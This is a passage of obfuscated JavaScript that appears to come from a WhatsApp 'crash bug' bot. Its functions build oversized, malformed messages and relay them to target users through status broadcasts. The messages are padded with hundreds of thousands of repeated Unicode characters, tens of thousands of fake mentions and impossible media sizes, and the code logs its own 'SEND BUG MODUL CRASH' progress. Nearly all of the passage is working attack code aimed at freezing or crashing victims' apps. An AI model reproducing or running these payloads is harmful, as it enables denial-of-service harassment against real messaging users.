҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉\n " + "ꦽ".repeat(300000);
      const _0x37613f = {
        text: _0x42fbb6
      };
      await _0x40d3ea.relayMessage(_0x41be41, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                  fileLength: "999999999",
                  pageCount: 9999999999999,
                  mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                  fileName: "NtahMengapa..",
                  fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1715880173",
                  contactVcard: true
                },
                title: "",
                hasMediaAttachment: true
              },
              body: _0x37613f,
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "0@s.whatsapp.net"),
                groupMentions: [{
                  groupJid: "0@s.whatsapp.net",
                  groupSubject: "anjay"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x41be41
        }
      }, {
        messageId: null
      });
    }
    async function _0xa4eb36(_0x1fdd1f) {
      const _0xcca8ca = [{
        tag: "bot",
        attrs: {
          biz_bot: "1"
        }
      }];
      const _0xffab78 = generateWAMessageFromContent(_0x1fdd1f, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
              messageSecret: crypto.randomBytes(32),
              supportPayload: JSON.stringify({
                version: 2,
                is_ai_message: true,
                should_show_system_message: true,
                ticket_id: crypto.randomBytes(16)
              })
            },
            interactiveMessage: {
              header: {
                title: "ḈṲṘṠḔṘḊ ḬṆṼḀṠḬṎṆ",
                hasMediaAttachment: false,
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
                  mimetype: "image/jpeg",
                  fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
                  fileLength: "11887",
                  height: 1080,
                  width: 1080,
                  mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
                  fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
                  directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1750124469",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
                  contextInfo: {
                    mentionedJid: [_0x1fdd1f],
                    participant: _0x1fdd1f,
                    remoteJid: _0x1fdd1f,
                    expiration: 9741,
                    ephemeralSettingTimestamp: 9741,
                    entryPointConversionSource: "WhatsApp.com",
                    entryPointConversionApp: "WhatsApp",
                    entryPointConversionDelaySeconds: 9742,
                    disappearingMode: {
                      initiator: "INITIATED_BY_OTHER",
                      trigger: "ACCOUNT_SETTING"
                    }
                  },
                  scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
                  scanLengths: [2071, 6199, 1634, 1983],
                  midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
                }
              },
              body: {
                text: "MODUL MENYERANG"
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000)
              }
            }
          }
        }
      }, {});
      await _0x40d3ea.relayMessage(_0x1fdd1f, _0xffab78.message, {
        participant: {
          jid: _0x1fdd1f
        },
        additionalNodes: _0xcca8ca,
        messageId: _0xffab78.key.id
      });
    }
    async function _0x4f1dbc(_0x51a31c, _0x210515) {
      const _0x4b2b8c = ["13135550002@s.whatsapp.net", ...Array.from({
        length: 40000
      }, () => "1" + Math.floor(Math.random() * 800000) + "@s.whatsapp.net")];
      const _0x5a527c = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Curserd Invasion" + "ោ៝".repeat(10000),
        title: "Mark Zuckerberg",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
      };
      const _0x2265a7 = {
        isSampled: true,
        mentionedJid: _0x4b2b8c
      };
      const _0x3cf3f0 = {
        newsletterJid: global.idSaluran,
        serverMessageId: 1,
        newsletterName: global.NameSaluran
      };
      const _0x1b22c8 = {
        embeddedMusic: _0x5a527c
      };
      const _0x303e81 = {
        embeddedContent: _0x1b22c8,
        embeddedAction: true
      };
      const _0x1843db = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ḈṲṘṠḔṘḊ ḬṆṼḀṠḬṎṆ",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: _0x2265a7,
        forwardedNewsletterMessageInfo: _0x3cf3f0,
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [_0x303e81]
      };
      const _0x2843c2 = _0x1843db;
      const _0x3690c1 = {
        videoMessage: _0x2843c2
      };
      const _0x53faea = {
        message: _0x3690c1
      };
      const _0x2fb483 = {
        viewOnceMessage: _0x53faea
      };
      const _0x560b2d = generateWAMessageFromContent(_0x51a31c, _0x2fb483, {});
      await _0x40d3ea.relayMessage("status@broadcast", _0x560b2d.message, {
        messageId: _0x560b2d.key.id,
        statusJidList: [_0x51a31c],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: _0x51a31c
              },
              content: undefined
            }]
          }]
        }]
      });
      if (_0x210515) {
        const _0x202e56 = {
          key: _0x560b2d.key,
          type: 25
        };
        const _0x2ed327 = {
          protocolMessage: _0x202e56
        };
        const _0x423e45 = {
          message: _0x2ed327
        };
        const _0x2576a9 = {
          statusMentionMessage: _0x423e45
        };
        const _0x26e0de = {
          tag: "meta",
          attrs: {},
          content: undefined
        };
        _0x26e0de.attrs.is_status_mention = "true";
        const _0x5c7ec2 = {
          additionalNodes: [_0x26e0de]
        };
        await _0x40d3ea.relayMessage(_0x51a31c, _0x2576a9, _0x5c7ec2);
      }
    }
    async function _0x327d67(_0x498ac4, _0x3d596c = true) {
      const _0x57d662 = Array.from({
        length: 30000
      }, (_0x40d70f, _0x2c8c16) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{
          title: "" + (_0x2c8c16 + 1),
          id: "" + (_0x2c8c16 + 1)
        }]
      }));
      const _0x102fe0 = {
        viewOnceMessage: {
          message: {
            listResponseMessage: {
              title: "✺𝐋𝐮𝐜𝐮𝐮 𝐀𝐧𝐣𝐢𝐫𝐫✿",
              listType: 2,
              buttonText: null,
              sections: _0x57d662,
              singleSelectReply: {
                selectedRowId: "🔴"
              },
              contextInfo: {
                mentionedJid: Array.from({
                  length: 30000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                participant: _0x498ac4,
                remoteJid: "status@broadcast",
                forwardingScore: 9741,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "333333333333@newsletter",
                  serverMessageId: 1,
                  newsletterName: "-"
                }
              },
              description: "Dont Bothering Me Bro!!!"
            }
          }
        },
        contextInfo: {
          channelMessage: true,
          statusAttributionType: 2
        }
      };
      const _0x453b30 = generateWAMessageFromContent(_0x498ac4, _0x102fe0, {});
      await _0x40d3ea.relayMessage("status@broadcast", _0x453b30.message, {
        messageId: _0x453b30.key.id,
        statusJidList: [_0x498ac4],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: _0x498ac4
              },
              content: undefined
            }]
          }]
        }]
      });
      if (_0x3d596c) {
        const _0x1840ce = {
          key: _0x453b30.key,
          type: 25
        };
        const _0x3b39fb = {
          protocolMessage: _0x1840ce
        };
        const _0xc84201 = {
          message: _0x3b39fb
        };
        const _0x1beaa5 = {
          statusMentionMessage: _0xc84201
        };
        const _0x276a41 = {
          tag: "meta",
          attrs: {},
          content: undefined
        };
        _0x276a41.attrs.is_status_mention = "Kapot Nichh";
        const _0x27907e = {
          additionalNodes: [_0x276a41]
        };
        await _0x40d3ea.relayMessage(_0x498ac4, _0x1beaa5, _0x27907e);
      }
    }
    async function _0x7b32c1(_0x45d399, _0x96c22e, _0x5918ff) {
      const _0x264980 = {
        viewOnceMessage: {
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              caption: "someone to stay",
              fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
              fileLength: "19769",
              height: 354,
              width: 783,
              mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
              fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
              directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
              mediaKeyTimestamp: "1743225419",
              jpegThumbnail: null,
              scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
              scanLengths: [2437, 17332],
              contextInfo: {
                mentionedJid: Array.from({
                  length: 30000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                isSampled: true,
                participant: _0x96c22e,
                remoteJid: "status@broadcast",
                forwardingScore: 9741,
                isForwarded: true
              }
            }
          }
        }
      };
      const _0x565986 = generateWAMessageFromContent(_0x96c22e, _0x264980, {});
      await _0x45d399.relayMessage("status@broadcast", _0x565986.message, {
        messageId: _0x565986.key.id,
        statusJidList: [_0x96c22e],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: _0x96c22e
              },
              content: undefined
            }]
          }]
        }]
      });
      if (_0x5918ff) {
        const _0x3868ab = {
          key: _0x565986.key,
          type: 25
        };
        const _0xbaf8e = {
          protocolMessage: _0x3868ab
        };
        const _0x4283b6 = {
          message: _0xbaf8e
        };
        const _0x433fc5 = {
          statusMentionMessage: _0x4283b6
        };
        const _0x1c7239 = {
          tag: "meta",
          attrs: {
            is_status_mention: "香"
          },
          content: undefined
        };
        const _0x81a0db = {
          additionalNodes: [_0x1c7239]
        };
        await _0x45d399.relayMessage(_0x96c22e, _0x433fc5, _0x81a0db);
      }
      console.log(chalk.white("PROSES SEND BUG MODUL CRASH V1"));
    }
    async function _0x97faef(_0x1a937a, _0x85c37b, _0x367866) {
      const _0xc5d725 = generateWAMessageFromContent(_0x85c37b, {
        viewOnceMessage: {
          message: {
            videoMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
              mimetype: "video/mp4",
              fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
              fileLength: "999999",
              seconds: 999999,
              mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
              caption: "someone to stay",
              height: 999999,
              width: 999999,
              fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
              directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1743742853",
              contextInfo: {
                isSampled: true,
                mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
                  length: 30000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")]
              },
              streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
              thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
              thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
              thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
              annotations: [{
                embeddedContent: {
                  embeddedMusic: {
                    musicContentMediaId: "kontol",
                    songId: "peler",
                    author: "Lynzz Official",
                    title: "Bokep",
                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                    countryBlocklist: true,
                    isExplicit: true,
                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                  }
                },
                embeddedAction: null
              }]
            }
          }
        }
      }, {});
      await _0x1a937a.relayMessage("status@broadcast", _0xc5d725.message, {
        messageId: _0xc5d725.key.id,
        statusJidList: [_0x85c37b],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: _0x85c37b
              },
              content: undefined
            }]
          }]
        }]
      });
      if (_0x367866) {
        const _0x41f79c = {
          key: _0xc5d725.key,
          type: 25
        };
        const _0x475e84 = _0x41f79c;
        const _0x57bc71 = {
          protocolMessage: _0x475e84
        };
        const _0x2d275e = _0x57bc71;
        const _0x296ac7 = {
          message: _0x2d275e
        };
        const _0xa7c7f9 = _0x296ac7;
        const _0x2360f7 = {
          groupStatusMentionMessage: _0xa7c7f9
        };
        const _0x40cbbc = _0x2360f7;
        const _0x1b3e10 = {
          tag: "meta",
          attrs: {},
          content: undefined
        };
        const _0x350ad5 = _0x1b3e10;
        _0x350ad5.attrs.is_status_mention = "true";
        const _0x3bddfc = {
          additionalNodes: [_0x350ad5]
        };
        const _0x3e37b7 = _0x3bddfc;
        await _0x1a937a.relayMessage(_0x85c37b, _0x40cbbc, _0x3e37b7);
      }
      console.log(chalk.red("PROSES SEND BUG MODUL CRASH V1"));
    }
    async function _0x72483f(_0x49cbcb, _0x5261da) {
      console.log("「SEND BUG INVIS」 " + _0x49cbcb);
      const _0x4f371b = Array.from({
        length: 9741
      }, (_0x36923c, _0x598826) => ({
        title: "᭯".repeat(9741),
        rows: [{
          title: "" + (_0x598826 + 1),
          id: "" + (_0x598826 + 1)
        }]
      }));
      const _0x4c086e = {
        viewOnceMessage: {
          message: {
            listResponseMessage: {
              title: "𝐀𝐧𝐚𝐤 𝐊𝐞𝐜𝐢𝐥 -𝟏𝟐𝐭𝐡 𝐀𝐝𝐚 𝐠𝐚𝐤?",
              listType: 2,
              buttonText: null,
              sections: _0x4f371b,
              singleSelectReply: {
                selectedRowId: "🌀"
              },
              contextInfo: {
                mentionedJid: Array.from({
                  length: 9741
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                participant: _0x49cbcb,
                remoteJid: "status@broadcast",
                forwardingScore: 9741,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "9741@newsletter",
                  serverMessageId: 1,
                  newsletterName: "-"
                }
              },
              description: "🤭🤑😋"
            }
          }
        },
        contextInfo: {
          channelMessage: true,
          statusAttributionType: 2
        }
      };
      const _0x2c30ea = generateWAMessageFromContent(_0x49cbcb, _0x4c086e, {});
      await _0x40d3ea.relayMessage("status@broadcast", _0x2c30ea.message, {
        messageId: _0x2c30ea.key.id,
        statusJidList: [_0x49cbcb],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: _0x49cbcb
              },
              content: undefined
            }]
          }]
        }]
      });
      if (_0x5261da) {
        const _0x4dbf89 = {
          key: _0x2c30ea.key,
          type: 25
        };
        const _0x2ea5e1 = {
          protocolMessage: _0x4dbf89
        };
        const _0x365893 = {
          message: _0x2ea5e1
        };
        const _0x260ce1 = {
          statusMentionMessage: _0x365893
        };
        const _0x2c6421 = {
          tag: "meta",
          attrs: {},
          content: undefined
        };
        _0x2c6421.attrs.is_status_mention = "⪨𝙂𝙤𝙤𝙯 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧⪩";
        const _0x31ef36 = {
          additionalNodes: [_0x2c6421]
        };
        await _0x40d3ea.relayMessage(_0x49cbcb, _0x260ce1, _0x31ef36);
      }
    }
    async function _0x591c90(_0x187c68, _0x5cd8ba) {
      const _0x1e29da = Array.from({
        length: 9741
      }, (_0x490f1a, _0x1d6048) => ({
        title: "꧀".repeat(9741),
        rows: ["{ title: " + (_0x1d6048 + 1) + ", id: " + (_0x1d6048 + 1) + " }"]
      }));
      const _0x457c31 = {
        viewOnceMessage: {
          message: {
            listResponseMessage: {
              title: "𝘨𝘸 𝘨𝘢𝘮𝘰𝘯 𝘯𝘫𝘪𝘳𝘳̴",
              listType: 2,
              buttonText: null,
              sections: _0x1e29da,
              singleSelectReply: {
                selectedRowId: "😭"
              },
              contextInfo: {
                mentionedJid: Array.from({
                  length: 9741
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                participant: _0x187c68,
                remoteJid: "status@broadcast",
                forwardingScore: 9741,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "9741@newsletter",
                  serverMessageId: 1,
                  newsletterName: "-"
                }
              },
              description: "😭"
            }
          }
        },
        contextInfo: {
          channelMessage: true,
          statusAttributionType: 2
        }
      };
      const _0x2e646a = generateWAMessageFromContent(_0x187c68, _0x457c31, {});
      await _0x40d3ea.relayMessage("status@broadcast", _0x2e646a.message, {
        messageId: _0x2e646a.key.id,
        statusJidList: [_0x187c68],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: _0x187c68
              },
              content: undefined
            }]
          }]
        }]
      });
      if (_0x5cd8ba) {
        const _0xd87d28 = {
          key: _0x2e646a.key,
          type: 25
        };
        const _0x498531 = {
          protocolMessage: _0xd87d28
        };
        const _0x3dad40 = {
          message: _0x498531
        };
        const _0x194ff0 = {
          statusMentionMessage: _0x3dad40
        };
        const _0xb30f66 = {
          tag: "meta",
          attrs: {},
          content: undefined
        };
        _0xb30f66.attrs.is_status_mention = "KapotID One Uliminate";
        const _0x1e3158 = {
          additionalNodes: [_0xb30f66]
        };
        await _0x40d3ea.relayMessage(_0x187c68, _0x194ff0, _0x1e3158);
      }
    }
    async function _0x1c3ed0(_0x1b1e71, _0x3cc729) {
      const _0x9b88d6 = 40000;
      const _0x3f44e1 = "13135550002@s.whatsapp.net";
      const _0x3a0b1a = {
        length: _0x9b88d6
      };
      const _0x19968e = [_0x3f44e1, ...Array.from(_0x3a0b1a, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")];
      const _0x55bceb = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
      const _0x55fa69 = "audio/mpeg";
      const _0x101dfc = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
      const _0x2f8413 = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
      const _0x2d687b = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
      const _0xad68ca = 99999999999999;
      const _0x430fa3 = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
      const _0x31a845 = 99999999999999;
      const _0x4b75bc = 99999999999999;
      const _0x21b896 = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";
      const _0x5711ae = {
        mentionedJid: _0x19968e,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: "KapotID 𝘐𝘴 𝘏𝘦𝘳𝘦"
        }
      };
      const _0x26ee9f = _0x5711ae;
      const _0x51551e = {
        url: _0x55bceb,
        mimetype: _0x55fa69,
        fileSha256: _0x101dfc,
        fileLength: _0x31a845,
        seconds: _0x4b75bc,
        ptt: true,
        mediaKey: _0x2d687b,
        fileEncSha256: _0x2f8413,
        directPath: _0x430fa3,
        mediaKeyTimestamp: _0xad68ca,
        contextInfo: _0x26ee9f,
        waveform: _0x21b896
      };
      const _0x130d9c = {
        audioMessage: _0x51551e
      };
      const _0x4fd0e8 = {
        message: _0x130d9c
      };
      const _0x2545ca = {
        ephemeralMessage: _0x4fd0e8
      };
      const _0x5d60cf = _0x2545ca;
      const _0x25ced4 = generateWAMessageFromContent(_0x1b1e71, _0x5d60cf, {
        userJid: _0x1b1e71
      });
      const _0x46a56a = {
        messageId: _0x25ced4.key.id,
        statusJidList: [_0x1b1e71],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: _0x1b1e71
              },
              content: undefined
            }]
          }]
        }]
      };
      const _0x56b25d = _0x46a56a;
      await _0x40d3ea.relayMessage("status@broadcast", _0x25ced4.message, _0x56b25d);
      if (_0x3cc729) {
        const _0xf8a275 = {
          key: _0x25ced4.key,
          type: 25
        };
        const _0x8dd9b2 = {
          protocolMessage: _0xf8a275
        };
        const _0x486cac = {
          message: _0x8dd9b2
        };
        const _0x18e0ef = {
          groupStatusMentionMessage: _0x486cac
        };
        const _0x554340 = {
          tag: "meta",
          attrs: {},
          content: undefined
        };
